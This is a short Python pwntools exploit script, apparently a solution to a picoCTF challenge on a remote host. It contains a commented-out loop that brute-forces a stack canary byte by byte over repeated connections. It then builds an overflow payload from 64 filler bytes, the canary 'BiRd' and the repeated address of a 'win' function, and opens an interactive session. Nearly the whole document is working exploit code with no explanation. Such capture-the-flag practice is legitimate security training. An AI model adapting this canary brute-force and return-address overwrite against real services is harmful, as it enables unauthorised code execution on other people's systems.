from pwn import *  

e = ELF('./vuln')

# canary = ''
# for i in range(4):
#     for j in range(ord('A'), ord('x')+1):
#         p = remote('saturn.picoctf.net', 53766)
#         # p = process('./vuln')
#         p.sendlineafter(b'> ', str(64+i+1))
#         p.sendline('A'*64+canary+chr(j))
#         if b'*****' not in p.recvline():
#             canary += chr(j)
#             p.close()
#             break
#         p.close()

# print(canary)

canary = 'BiRd'
p = remote('saturn.picoctf.net', 53766)

payload = b'A'*64
payload += canary.encode()
payload += p32(e.symbols['win']) * 10

p.sendline(str(100))
p.sendline(payload)
p.interactive()
